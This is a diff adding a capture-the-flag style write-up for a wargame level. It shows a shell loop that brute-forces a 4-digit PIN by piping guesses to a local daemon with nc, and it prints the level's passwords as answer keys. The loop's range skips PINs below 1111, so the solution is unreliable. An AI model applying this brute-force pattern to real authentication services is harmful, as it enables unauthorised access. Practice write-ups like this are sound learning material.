@@ -1,0 +1,26 @@
+Description:
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+---
+
+Solution:
+# So what we need to do is to supply the command line with all the necessary combinations to bruteforce that
+# What i did
+mkdir -p /tmp/zoe
+cd /tmp/zoe
+vim zoaki.sh
+# Contents of zoaki.sh
+for i in {1111..9999}
+    do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done
+# after taht
+chmod +x zoaki.sh
+./zoaki.sh | nc localhost 30002
+# and thats all there is to it
+# u can add the pipe at the next line of the script after done i just didnt want to
+
+---
+
+Password:
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
